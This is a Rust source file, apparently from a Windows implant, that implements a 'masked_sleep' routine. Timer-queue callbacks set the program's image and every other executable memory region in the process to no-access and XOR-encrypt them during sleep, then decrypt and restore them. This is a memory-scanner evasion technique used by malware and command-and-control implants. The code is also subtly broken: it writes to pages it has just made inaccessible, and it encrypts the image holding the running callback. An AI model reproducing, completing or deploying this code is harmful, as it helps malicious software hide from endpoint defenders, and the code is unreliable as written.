#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        Threading::{
            CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
            WT_EXECUTEINTIMERTHREAD,
        },
        LibraryLoader::GetModuleHandleA,
        Memory::{
            VirtualQuery, VirtualProtect, MEMORY_BASIC_INFORMATION,
            PAGE_NOACCESS, PAGE_EXECUTE_READ, MEM_COMMIT,
        },
    },
    Foundation::HANDLE,
};

#[cfg(target_os = "windows")]
static mut SLEEP_KEY: [u8; 16] = [0u8; 16];

#[cfg(target_os = "windows")]
pub unsafe fn masked_sleep(duration_ms: u32) {
    use rand::RngCore;
    rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);

    let image_base = GetModuleHandleA(core::ptr::null()) as *mut u8;
    let image_size = get_image_size(image_base);

    let timer_queue = CreateTimerQueue();

    let ctx1 = Box::into_raw(Box::new(SleepCtx { base: image_base, size: image_size, encrypt: true }));
    let mut t1: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t1, timer_queue,
        Some(sleep_callback), ctx1 as _, 0, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    let ctx2 = Box::into_raw(Box::new(SleepCtx { base: image_base, size: image_size, encrypt: false }));
    let mut t2: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t2, timer_queue,
        Some(sleep_callback), ctx2 as _, duration_ms, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    windows_sys::Win32::System::Threading::Sleep(duration_ms + 100);
    DeleteTimerQueueEx(timer_queue, windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE);
}

#[cfg(target_os = "windows")]
struct SleepCtx { base: *mut u8, size: usize, encrypt: bool }

#[cfg(target_os = "windows")]
unsafe extern "system" fn sleep_callback(ctx: *mut core::ffi::c_void, _: u8) {
    let ctx = &*(ctx as *const SleepCtx);
    let mut old = 0u32;
    if ctx.encrypt {
        // Encrypt: first hide the image, then encrypt all RX regions
        VirtualProtect(ctx.base as _, ctx.size, PAGE_NOACCESS, &mut old);
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
        encrypt_rx_regions(ctx.base, ctx.size);
    } else {
        // Decrypt: restore all RX regions first, then restore image
        decrypt_rx_regions(ctx.base, ctx.size);
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
        VirtualProtect(ctx.base as _, ctx.size, PAGE_EXECUTE_READ, &mut old);
    }
}

#[cfg(target_os = "windows")]
unsafe fn xor_region(base: *mut u8, size: usize, key: &[u8; 16]) {
    for i in 0..size {
        *base.add(i) ^= key[i % 16];
    }
}

#[cfg(target_os = "windows")]
unsafe fn encrypt_rx_regions(image_base: *mut u8, image_size: usize) {
    let mut addr: usize = 0;
    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = core::mem::zeroed();
        let ret = VirtualQuery(addr as _, &mut mbi, core::mem::size_of::<MEMORY_BASIC_INFORMATION>());
        if ret == 0 { break; }
        let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
        // Skip the image itself (already handled by caller), skip zero-size
        let is_image = mbi.BaseAddress as usize == image_base as usize;
        if mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READ && !is_image && mbi.RegionSize > 0 {
            let mut old = 0u32;
            VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_NOACCESS, &mut old);
            xor_region(mbi.BaseAddress as *mut u8, mbi.RegionSize, &SLEEP_KEY);
        }
        addr = region_end;
        if addr == 0 { break; }
    }
}

#[cfg(target_os = "windows")]
unsafe fn decrypt_rx_regions(image_base: *mut u8, image_size: usize) {
    let mut addr: usize = 0;
    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = core::mem::zeroed();
        let ret = VirtualQuery(addr as _, &mut mbi, core::mem::size_of::<MEMORY_BASIC_INFORMATION>());
        if ret == 0 { break; }
        let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
        let is_image = mbi.BaseAddress as usize == image_base as usize;
        // PAGE_NOACCESS = 0x01 — encrypted regions are marked noaccess
        if mbi.State == MEM_COMMIT && mbi.Protect == PAGE_NOACCESS && !is_image && mbi.RegionSize > 0 {
            xor_region(mbi.BaseAddress as *mut u8, mbi.RegionSize, &SLEEP_KEY);
            let mut old = 0u32;
            VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READ, &mut old);
        }
        addr = region_end;
        if addr == 0 { break; }
    }
}

#[cfg(target_os = "windows")]
unsafe fn get_image_size(base: *mut u8) -> usize {
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    *(base.add(e_lfanew + 0x18 + 0x38) as *const u32) as usize
}
